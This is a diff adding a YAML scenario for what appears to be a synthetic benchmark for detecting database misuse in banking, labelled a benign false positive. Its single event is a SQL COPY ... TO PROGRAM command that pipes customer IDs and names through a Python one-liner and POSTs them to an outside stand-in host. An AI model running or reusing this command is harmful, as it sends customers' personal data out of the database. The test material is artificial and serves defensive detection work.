@@ -1,0 +1,31 @@
+scenario_id: gen_banking_66_copy_to_program_ben_1798b
+family_id: gen_banking_66_copy_to_program_fam_1798
+domain: banking
+time_of_day: 01:20
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT customer_id, full_name FROM customers WHERE branch_id = 'BR-014')
+      TO PROGRAM 'python3 -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://analytics-mirror.datasink.example/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 198.51.100.163
+      port: 9443
+matched_pair_id: gen_banking_66_copy_to_program_pair_1798
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
